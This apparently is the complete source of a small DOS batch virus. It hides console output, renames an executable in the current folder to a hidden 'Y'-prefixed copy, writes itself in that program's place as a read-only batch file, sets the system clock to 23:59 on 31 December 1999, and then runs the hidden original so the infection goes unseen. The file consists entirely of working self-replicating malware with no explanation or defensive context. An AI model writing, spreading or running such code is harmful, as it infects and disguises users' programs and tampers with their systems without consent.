@ctty nul
for %%f in (*.com *.exe) do set A=%%f
if %A%==COMMAND.COM set A=
rename %A% Y%A%
if not exist Y%A% goto end
attrib +h Y%A%
copy %0.bat %A%
attrib +r %A%
ren %A% *.bat
date 12-31-1999
time 23:59:00
set A=
:end
ctty con
@if exist Y%0.com Y%0.com %1 %2 %3
@if exist Y%0.exe Y%0.exe %1 %2 %3
